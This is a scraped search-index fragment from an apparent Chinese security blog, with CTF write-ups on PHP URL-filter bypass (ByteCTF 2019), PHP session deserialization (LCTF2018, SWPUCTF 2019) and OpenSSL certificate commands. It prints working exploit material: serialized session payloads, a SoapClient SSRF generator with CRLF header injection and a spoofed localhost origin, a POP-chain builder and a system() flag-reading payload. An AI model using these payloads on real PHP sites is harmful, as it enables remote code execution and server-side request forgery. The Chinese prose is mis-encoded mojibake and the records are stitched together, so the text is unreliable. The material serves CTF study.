\u0026lt;author\u0026gt;author@example.com\u0026lt;/author\u0026gt; \u0026lt;pubDate\u0026gt;Mon, 03 Feb 2014 00:00:00 -0000\u0026lt;/pubDate\u0026gt; \u0026lt;/item\u0026gt; \u0026lt;/channel\u0026gt; \u0026lt;/rss\u0026gt; $b,$a);}system(\u0026#39;cat /flag_eb8ba2eb07702e69963a7d6ab8669134\u0026#39;);\u0026#34; ","permalink":"https://dragonbox.top/posts/ctf-bytectf2019/","summary":"\u003ch2 id=\"boring-code\"\u003eboring code\u003c/h2\u003e\n\u003cp\u003esource code\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-php\" data-lang=\"php\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026lt;?\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ephp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eis_valid_url\u003c/span\u003e($url) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003efilter_var\u003c/span\u003e($url, \u003cspan style=\"color:#a6e22e\"\u003eFILTER_VALIDATE_URL\u003c/span\u003e)) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003epreg_match\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/data:\\/\\//i\u0026#39;\u003c/span\u003e, $url)) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003eisset\u003c/span\u003e($_POST[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;url\u0026#39;\u003c/span\u003e])){\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    $url \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e $_POST[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;url\u0026#39;\u003c/span\u003e];\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003eis_valid_url\u003c/span\u003e($url)) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        $r \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eparse_url\u003c/span\u003e($url);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003epreg_match\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/baidu\\.com$/\u0026#39;\u003c/span\u003e, $r[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;host\u0026#39;\u003c/span\u003e])) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            $code \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efile_get_contents\u003c/span\u003e($url);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;;\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e===\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003epreg_replace\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/[a-z]+\\((?R)?\\)/\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003eNULL\u003c/span\u003e, $code)) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003epreg_match\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i\u0026#39;\u003c/span\u003e, $code)) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    \u003cspan style=\"color:#66d9ef\"\u003eecho\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;bye~\u0026#39;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                } \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    \u003cspan style=\"color:#66d9ef\"\u003eeval\u003c/span\u003e($code);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        } \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eecho\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;error: host not allowed\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    } \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eecho\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;error: invalid url\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003ehighlight_file\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003e__FILE__\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ€è·¯: æ³¨å†Œä¸€ä¸ªxxxxbaidu.com å½¢å¼çš„åŸŸå.ç»‘å®šåˆ°æœåŠ¡å™¨ä¸Šåæ”¾ä¸Šè‡ªå·±çš„ä»£ç ,payload\u003c/p\u003e","title":"bytectf2019"},{"content":"phpä¸­çš„ååºåˆ—åŒ–åˆ†ä¸ºä¸¤ç±»: ä¸€ç§æ˜¯å¸¸è§„ctfé¢˜ç›®ä¸­çš„ç›´æ¥ä¼ å…¥å¹¶ååºåˆ—åŒ–, å¦ä¸€ç§å’Œsessionæœ‰å…³:\nsessionååºåˆ—åŒ–æ¼æ´ ç‰¹å¾ phpinfoä¸­é»˜è®¤çš„session.serialize_handlerå’Œæœ¬åœ°çš„å€¼ä¸ä¸€æ · ini_set(\u0026lsquo;session.serialize_handler\u0026rsquo;, \u0026lsquo;php\u0026rsquo;);ä¹‹ç±»çš„ phpinfoä¸­session.upload_progress.enabledæ‰“å¼€ ä¸€æ—¦å‘ç°è„šæœ¬ä¸­çš„åºåˆ—åŒ–å¤„ç†å™¨å’Œphp.iniè®¾ç½®çš„ä¸ä¸€æ ·,å°±å¯èƒ½å¯¼è‡´è¿™ä¸ªæ¼æ´.\nphp çš„ session éƒ½æ˜¯ä»¥æ–‡ä»¶çš„å½¢å¼è¿›è¡Œå­˜å‚¨çš„, å¸¸è§çš„ä½ç½®å¦‚ä¸‹\n/var/lib/php/sess_xxxxx /var/lib/php/sessions/sess_xxxxx /tmp/sess_xxxxx /tmp/sessions/sess_xxxxx phpç”¨äºå­˜å–sessionæ—¶å€™çš„ä¸‰ç§å¤„ç†å™¨\nphp:é”®å ï¼‹ ç«–çº¿ ï¼‹ åºåˆ—åŒ–å­—ç¬¦ä¸² php_binary: é”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ ï¼‹ é”®å ï¼‹åºåˆ—åŒ–å­—ç¬¦ä¸² php_serialize: åºåˆ—åŒ–å­—ç¬¦ä¸² åœ¨æ²¡æœ‰å¯¹sessionè¿›è¡Œé…ç½®çš„æƒ…å†µä¸‹, é»˜è®¤ä½¿ç”¨phpåºåˆ—åŒ–å¤„ç†æ¨¡å¼.\nå¦‚æœä»¥php_serialize æ–¹å¼å­˜å–ä½†æ˜¯åˆç”¨phpå¤„ç†å™¨å»å¤„ç†, é‚£ä¹ˆåªè¦ä¼ å…¥çš„å­—ç¬¦ä¸²ä¸­æœ‰ | å°±å¯ä»¥å¯¼è‡´phpå¤„ç†å™¨å°† | å‰çš„ä¸œä¸œè§£é‡Šæˆé”®, è€Œå°†åé¢çš„ä¸œè¥¿è§£é‡Šç§°å€¼, è€Œåé¢çš„ä¸œè¥¿ä¸€èˆ¬å°±æ˜¯è¦ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²äº†.\nphp5.6.13ç‰ˆæœ¬ä»¥å‰æ˜¯ç¬¬ä¸€ä¸ªå˜é‡è§£æé”™è¯¯æ³¨é”€ç¬¬ä¸€ä¸ªå˜é‡ï¼Œç„¶åè§£æç¬¬äºŒä¸ªå˜é‡ï¼Œä½†æ˜¯5.6.13ä»¥åå¦‚æœç¬¬ä¸€ä¸ªå˜é‡é”™è¯¯ï¼Œç›´æ¥é”€æ¯æ•´ä¸ªsession, æ‰€ä»¥è¿™ä¸ªæ´è¦çœ‹ç‰ˆæœ¬\nå°†payloadä¼ å…¥sessionçš„æ–¹å¼æœ‰ä¸¤ç§, ä¸€ç§æ˜¯å¯¹é¢å¼€æ”¾æœ¬åœ°å¯æ§çš„æ•°æ®, å¦ä¸€ç§æ˜¯å› ä¸ºé…ç½®ä¸å½“é€ æˆsessionå¯æ§\nå½“session.upload_progress.enabledæ‰“å¼€æ—¶ï¼Œphpä¼šè®°å½•ä¸Šä¼ æ–‡ä»¶çš„è¿›åº¦ï¼Œåœ¨ä¸Šä¼ æ—¶ä¼šå°†å…¶ä¿¡æ¯ä¿å­˜åœ¨$SESSIONä¸­ã€‚\n_å½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶POSTä¸€ä¸ªä¸INIä¸­è®¾ç½®çš„session.upload_progress.nameåŒåå˜é‡æ—¶ï¼Œ å½“PHPæ£€æµ‹åˆ°è¿™ç§POSTè¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨$_SESSIONä¸­æ·»åŠ ä¸€ç»„æ•°æ®ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡Session Upload Progressæ¥è®¾ç½®sessionã€‚\nä¸Šä¼ è¡¨å•\n\u0026lt;form action=\u0026#34;http://web.jarvisoj.com:32784/index.php\u0026#34; method=\u0026#34;POST\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;PHP_SESSION_UPLOAD_PROGRESS\u0026#34; value=\u0026#34;123\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; å…¶ä¸­ç›®æ ‡ç½‘å€éœ€è¦æ›¿æ¢, php_session_upload_progressæ˜¯session.upload_progress.nameçš„åå­—, ä»phpinfoä¸­çœ‹.\nç„¶åéšä¾¿ä¼ ç‚¹ä»€ä¹ˆè¿›å». åœ¨burpsuiteä¸­åšå¦‚ä¸‹ä¿®æ”¹\nå°†éšä¾¿ä¼ çš„æ–‡ä»¶çš„filenameæˆpayload, æ¯”å¦‚\n|O:5:\\\u0026#34;OowoO\\\u0026#34;:1:{s:4:\\\u0026#34;mdzz\\\u0026#34;;s:36:\\\u0026#34;print_r(scandir(dirname(__FILE__)));\\\u0026#34;;} è¿™é‡Œçš„æ–œæ†æ˜¯ä¸ºäº†é˜²æ­¢è½¬ä¹‰.ç­¾åçš„ç«–çº¿å°±æ˜¯å¸®åŠ©phpå¤„ç†å™¨è§£é‡Šä½¿ç”¨çš„.\nä¾‹é¢˜LCTF2018-bestphpâ€™s revenge é¢˜ç›®ç›´æ¥ç»™å‡ºäº†æºä»£ç \n\u0026lt;?php highlight_file(__FILE__); $b = \u0026#39;implode\u0026#39;; call_user_func($_GET[\u0026#39;f\u0026#39;], $_POST); session_start(); if (isset($_GET[\u0026#39;name\u0026#39;])) { $_SESSION[\u0026#39;name\u0026#39;] = $_GET[\u0026#39;name\u0026#39;]; } var_dump($_SESSION); $a = array(reset($_SESSION), \u0026#39;welcome_to_the_lctf2018\u0026#39;); call_user_func($b, $a); ?\u0026gt; æ•´ç†ä¸€ä¸‹\ncall_user_func: ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„åå­—,ç¬¬äºŒä¸ªä¹‹åçš„å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°,ç‰¹åˆ«çš„,å¦‚æœä¼ å…¥çš„æ˜¯ä¸€ä¸ªæ•°ç»„çš„è¯,ä»–ä¼šå°†æ•°ç»„çš„ç¬¬ä¸€é¡¹è¯†åˆ«ä¸ºç±»å’Œå¯¹è±¡,å¹¶å°†ä¹‹åçš„å‚æ•°ä½œä¸ºç±»å’Œå¯¹è±¡çš„æ–¹æ³•æ¥è°ƒç”¨.\nresetä¼šå°†æ•°ç»„çš„ç¬¬ä¸€é¡¹ä½œä¸ºå­—ç¬¦ä¸²è¾“å‡º\nimplode å‡½æ•°åªæ˜¯åˆå¹¶æ•°ç»„çš„æ—¶å€™æ’å…¥ä¸€äº›ç»™å®šå­—ç¬¦è€Œå·²,æ— å…³ç´§è¦.\næ‰«æç›®å½•å‘ç°äº†flag.php\nsession_start(); echo \u0026#39;only localhost can get flag!\u0026#39;; $flag = \u0026#39;LCTF{*************************}\u0026#39;; if($_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;]===\u0026#34;127.0.0.1\u0026#34;){ $_SESSION[\u0026#39;flag\u0026#39;] = $flag; } only localhost can get flag! è§„å®šlocalhostè®¿é—®,é‚£ä¹ˆå¿…é¡»è¦æ‰¾åˆ°ssrfçš„æœºä¼š.\né¢˜ç›®æç¤ºååºåˆ—åŒ–,ä½†æ˜¯é¢˜ç›®æºç ä¸­æ²¡æœ‰ä»»ä½•ç»™å®šçš„ç±»,åœ¨æ­¤æƒ…å†µä¸‹åªèƒ½è€ƒè™‘phpçš„åŸç”Ÿç±».æœ¬é¢˜é‡‡ç”¨çš„æ˜¯SoapClientç±».åœ¨è¿™ä¸ªç±»çš„å¯¹è±¡è°ƒç”¨æœªçŸ¥çš„æ–¹æ³•æ—¶å€™å°±ä¼šè°ƒç”¨callå‡½æ•°,åŒæ—¶è§¦å‘è¯·æ±‚,è¿™ä¸ªç±»æ”¯æŒhttp/https, ç®€å•çš„ä½¿ç”¨å®ä¾‹å¦‚ä¸‹:\n\u0026lt;?php $url = \u0026#34;http://127.0.0.1:12334/flag.php\u0026#34;; $b = new SoapClient(null, array(\u0026#39;uri\u0026#39; =\u0026gt; $url, \u0026#39;location\u0026#39; =\u0026gt;$url)); $a = serialize($b); $c = unserialize($a); $c-\u0026gt;a(); ?\u0026gt; nc æ¥å—:\né‚£ä¹ˆå¯ä»¥è¿™æ ·å­:\ncall_user_func(\u0026lsquo;session_start\u0026rsquo;,\u0026lsquo;serialize_handler=php_serialize\u0026rsquo;)æå‰å¼€å¯php sessionå¹¶è§„å®šå¥½æœ¬åœ°çš„serialize_handlerä¸ºphp_serialize, è€Œé»˜è®¤çš„sessionåºåˆ—åŒ–å¤„ç†å™¨ä¸ºphp,è¿™å°±ä¼šå¯¼è‡´ä¸Šé¢è¯´åˆ°çš„sessionååºåˆ—åŒ–æ¼æ´.å½“ç„¶,nameçš„å€¼æ˜¯ç«–çº¿åŠ ä¸ŠSoapClientåºåˆ—åŒ–å­—ç¬¦ä¸²,uriå’Œlocationçš„å€¼éƒ½æŒ‡å‘flag.php sessionå­˜å–å®Œæˆä¹‹åå°±è¦æƒ³åŠæ³•å»ååºåˆ—åŒ–å’Œè§¦å‘æœªçŸ¥æ–¹æ³•,è¿™é‡Œä½¿ç”¨å˜é‡è¦†ç›–(extract)å°†bè¦†ç›–ä¸ºcall_user_func,å› ä¸ºbæœ‰æœºä¼šæ¥å—sessionååºåˆ—åŒ–çš„å­—ç¬¦ä¸²,å¹¶å°†æ•°ç»„ä¼ å…¥bä¸­,è°ƒç”¨welcome_to_the_lctf2018æ–¹æ³•,ä»è€Œè§¦å‘callå‡½æ•°,é€ æˆssrf æœ€åssrfçš„ç»“æœä¹Ÿä¼šå­˜æ”¾åœ¨sessoinä¸­,æ‰€ä»¥è·å–SoapClientçš„PHPSSIDå¹¶å»è®¿é—®index.php(é‡Œé¢æœ‰var_dump(session))å¾—åˆ°flag SWPUCTF 2019 web6 å‰é¢éƒ¨åˆ†çœç•¥, æ¥åˆ°æºç éƒ¨åˆ†\n\u0026lt;?php ini_set(\u0026#39;session.serialize_handler\u0026#39;, \u0026#39;php\u0026#39;); class aa { public $mod1; public $mod2; public function __call($name,$param) { if($this-\u0026gt;{$name}) { $s1 = $this-\u0026gt;{$name}; $s1(); } } public function __get($ke) { return $this-\u0026gt;mod2[$ke]; } } class bb { public $mod1; public $mod2; public function __destruct() { $this-\u0026gt;mod1-\u0026gt;test2(); } } class cc { public $mod1; public $mod2; public $mod3; public function __invoke() { $this-\u0026gt;mod2 = $this-\u0026gt;mod3.$this-\u0026gt;mod1; } } class dd { public $name; public $flag; public $b; public function getflag() { session_start(); var_dump($_SESSION); $a = array(reset($_SESSION),$this-\u0026gt;flag); echo call_user_func($this-\u0026gt;b,$a); } } class ee { public $str1; public $str2; public function __toString() { $this-\u0026gt;str1-\u0026gt;{$this-\u0026gt;str2}(); return \u0026#34;1\u0026#34;; } } $a = $_POST[\u0026#39;aa\u0026#39;]; unserialize($a); ?\u0026gt; ssrfç”Ÿæˆsessionååºåˆ—åŒ–\n\u0026lt;?php $target = \u0026#39;http://127.0.0.1/interface.php\u0026#39;; $headers = array( \u0026#39;X-Forwarded-For: 127.0.0.1\u0026#39;, \u0026#39;Cookie: user=xZmdm9NxaQ==\u0026#39;, ); $b = new SoapClient(null, array(\u0026#39;location\u0026#39; =\u0026gt; $target, \u0026#39;user_agent\u0026#39;=\u0026gt;\u0026#39;wupco^^Content-Type: application/x-www-form-urlencoded^^\u0026#39;.join(\u0026#39;^^\u0026#39;,$headers),\u0026#39;uri\u0026#39;=\u0026gt;\u0026#39;aabb\u0026#39;)); $a = serialize($b); $a = str_replace(\u0026#39;^^\u0026#39;, \u0026#34;\\r\\n\u0026#34;, $a); echo $a; // echo urlencode($a); åºåˆ—åŒ–ç”Ÿæˆ, è§¦å‘ååºåˆ—åŒ–åè¿›è€Œè§¦å‘sessionçš„ååºåˆ—åŒ–\n$first = new bb(); $second = new aa(); $third = new cc(); $four = new ee(); $first -\u0026gt;mod1 = $second; $third -\u0026gt; mod1 = $four; $f = new dd(); $f-\u0026gt;flag=\u0026#39;Get_flag\u0026#39;; $f-\u0026gt;b=\u0026#39;call_user_func\u0026#39;; $four -\u0026gt; str1 = $f; $four -\u0026gt; str2 = \u0026#34;getflag\u0026#34;; $second -\u0026gt;mod2[\u0026#39;test2\u0026#39;] = $third; echo serialize($first); PHPSESSIDéšä¾¿æŒ‡å®šå†™ä¸€ä¸ªæ¯”å¦‚kké»˜è®¤æƒ…å†µä¸‹ä¼šç”Ÿæˆsess_kk sessionæ–‡ä»¶\nå‚è€ƒ\nhttps://www.smi1e.top/lctf2018-bestphps-revenge-%E8%AF%A6%E7%BB%86%E9%A2%98%E8%A7%A3/\nhttp://www.91ri.org15925.html\nhttps://skysec.top/2017/08/16/jarvisoj-web/#PHPINFO\nhttps://blog.spoock.com/2016/10/16/php-serialize-problem/\nhttps://www.freebuf.com/vuls/202819.html\n","permalink":"https://dragonbox.top/posts/sec-php%E7%9A%84%E4%B8%A4%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","summary":"\u003cp\u003ephpä¸­çš„ååºåˆ—åŒ–åˆ†ä¸ºä¸¤ç±»: ä¸€ç§æ˜¯å¸¸è§„ctfé¢˜ç›®ä¸­çš„ç›´æ¥ä¼ å…¥å¹¶ååºåˆ—åŒ–, å¦ä¸€ç§å’Œsessionæœ‰å…³:\u003c/p\u003e","title":"php sessionååºåˆ—åŒ–"},{"content":" æ¥çœ‹çœ‹äº’è”ç½‘ä¸–ç•Œçš„åŸºçŸ³\né€šä¿¡è¿‡ç¨‹çš„ç®€åŒ–æ¨¡å‹ ç¬¬ä¸€é˜¶æ®µ: æœåŠ¡å™¨å‘CAå‘èµ·è¯ä¹¦ç­¾åè¯·æ±‚ æœåŠ¡å™¨ç»„ç»‡ç”Ÿæˆä¸€ä¸ªç§é’¥\nopenssl genrsa -out target.key 1024 ä»ç§é’¥æ–‡ä»¶ä¸­å¾—åˆ°å…¬é’¥, è¿™ä¸ªå…¬é’¥ä¼šè¢«ç”¨äºç»™CAç­¾å\nopenssl rsa -in target.key -pubout -out target_pub.key ä½¿ç”¨ç§é’¥ç”Ÿæˆä¸€ä¸ªè¯ä¹¦ç­¾åè¯·æ±‚, åœ¨ç”Ÿæˆè¿‡ç¨‹ä¸­éœ€è¦å¡«å†™è¯ä¹¦ç”³è¯·äººçš„ä¸€äº›ä¿¡æ¯\nopenssl req -new -key target.key -out target.csr ç”Ÿæˆå®Œæˆå, å¯ä»¥è¿è¡Œä¸‹é¢å‘½ä»¤çœ‹çœ‹è¿™ä¸ªè¯ä¹¦ç­¾åè¯·æ±‚æ–‡ä»¶é‡Œéƒ½æœ‰ä»€ä¹ˆ\nopenssl req -text -in target.csr -verify ä¾‹å¦‚:\nå¯ä»¥çœ‹åˆ°å…¬é’¥ä¹Ÿåœ¨é‡Œé¢.\næ¥ä¸‹æ¥æŠŠè¯ä¹¦ç­¾åè¯·æ±‚æ–‡ä»¶æäº¤ç»™CA, CAå®¡æ ¸é€šè¿‡åå¯¹è¯¥æ–‡ä»¶è¿›è¡Œç­¾å\nopenssl x509 -in target.csr -out target.crt -req -signkey ca.key -days 365 target.crtå°±æ˜¯ç­¾åæˆåŠŸåçš„è¯ä¹¦. å¯¹äºå¸¸è§çš„è‡ªç­¾ååœºæ™¯æ¥è¯´, ca.keyå°±æ˜¯target.key, ç”¨è‡ªå·±çš„å¯†é’¥å»ç­¾åè‡ªå·±çš„è¯ä¹¦è¯·æ±‚, è‡ªç­¾åè¯·æ±‚å‘½ä»¤å°±æ˜¯\nopenssl x509 -in target.csr -out target.crt -req -signkey target.key -days 365 ç„¶åCAå°†target.crtä»¥åŠç”±Root CAç­¾åçš„CAè¯ä¹¦ä¸€åŒè¿”å›ç»™ç”³è¯·äºº. å¦‚ä¸‹å›¾æ‰€ç¤º:\nRoot CAçš„è¯ä¹¦å°±é‚£ä¹ˆå‡ ä¸ª, å†…ç½®åœ¨æ“ä½œç³»ç»Ÿé‡Œ, å—åˆ°æ‰€æœ‰ç¨‹åºçš„ä¿¡ä»», å› æ­¤ç”³è¯·äººå¾—åˆ°ç”±Root CAç­¾åçš„CAè¯ä¹¦å, å°±å¯ä»¥ä¿¡ä»»è¯¥CAç»„ç»‡, è¿›è€Œå¯ä»¥ä¿¡ä»»è¯¥CAç»„ç»‡ç­¾å‘ç»™è‡ªå·±çš„è¯ä¹¦. å¯¹äºå…¶ä»–çš„å®¢æˆ·ç«¯è€Œè¨€ä¹Ÿæ˜¯è¿™æ ·.\nç¬¬äºŒé˜¶æ®µ å®¢æˆ·è®¿é—®æœåŠ¡ç«¯ å®¢æˆ·ç«¯å‘èµ·è¯·æ±‚, æœåŠ¡ç«¯ä¼šæŠŠè‡ªå·±çš„è¯ä¹¦å’Œç­¾è‡ªå·±è¯ä¹¦çš„CAæœºæ„çš„è¯ä¹¦ä¸€èµ·å‘è¿‡å»\nå¦‚å›¾, ç”±äºRoot CAæ˜¯å¯ä¿¡ä»»çš„, å› æ­¤è¯¥CAæœºæ„æ˜¯å¯ä¿¡ä»»çš„, å› æ­¤è¯¥CAæœºæ„ç­¾å‘çš„æœåŠ¡ç«¯è¯ä¹¦ä¹Ÿæ˜¯å¯ä¿¡ä»»çš„, è¿™å« ä¿¡ä»»é“¾.\nä¿¡ä»»å»ºç«‹ä¹‹å, å®¢æˆ·ç«¯ç”Ÿæˆä¸€ä¸ªå¯¹ç§°å¯†é’¥, ç”¨æœåŠ¡ç«¯è¯ä¹¦é‡Œçš„å…¬é’¥åŠ å¯†ä¹‹åå‘é€ç»™æœåŠ¡ç«¯, æœ€ååŒæ–¹éƒ½ç”¨è¿™ä¸ªå¯¹ç§°å¯†é’¥æ¥åŠ å¯†æ•°æ®è¿›è¡Œä¿¡æ¯äº¤æ¢ (å®é™…ä¸Š, å¯¹ç§°å¯†é’¥çš„ç”Ÿæˆæ˜¯æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯é€šè¿‡å½¼æ­¤åå•†è¿‡ç¨‹ä¸­çš„å„ç§æ¶ˆæ¯å„è‡ªä½¿ç”¨ç›¸åŒçš„ç®—æ³•ç”Ÿæˆçš„, å¹¶ä¸ä¼šç›´æ¥åœ¨ç½‘ç»œä¸Šä¼ è¾“, åªä¸è¿‡è¿™äº›æ¶ˆæ¯ä¸­æœ‰ä¸€éƒ¨åˆ†æ˜¯å…¬é’¥åŠ å¯†åä¼ è¾“çš„, å› æ­¤ä¹Ÿç±»ä¼¼äºå°†å¯¹ç§°å¯†é’¥è¿›è¡Œå…¬é’¥åŠ å¯†äº†)\nä¿¡æ¯æå– ç”Ÿæˆä¸€ä¸ªåŒ…å«å¯†é’¥å’Œå…¬é’¥çš„æ–‡ä»¶,æ—¢å¯ä»¥ç”¨æ¥åŠ å¯†ä¹Ÿå¯ä»¥ç”¨æ¥è§£å¯†.\nopenssl genrsa -out target.key 1024 ä»è¿™ä¸ªåŒ…å«å…¬é’¥å’Œç§é’¥çš„æ–‡ä»¶ä¸­æå–å‡ºå…¬é’¥\nopenssl rsa -in target.key -pubout -out target_pub.key ä»å…¬é’¥ä¸­æå–rsaå…¬é’¥ä¿¡æ¯\nopenssl rsa -pubin -in (filename) -text æå–å…¶ä¸­æ¨¡æ•°\nopenssl rsa -pubin -in (filename) -text -modulus åŠ å¯†è§£å¯† å…¬é’¥åŠ å¯†\nopenssl rsautl -encrypt -in target -out target.enc -inkey target_pub.pem -pubin ç§é’¥è§£å¯†\nopenssl rsautl -decrypt -in target.enc -out target -inkey target_pri.pem ç”¨ä¸‰ç§å¡«å……æ–¹å¼è§£å¯†,(ç¬¬ä¸€ç§æ²¡æœ‰å¡«å……)\nopenssl rsautl -decrypt -in flag.enc -inkey private.key -out flag.dec openssl rsautl -decrypt -in flag.enc -inkey private.key -out flag.dec 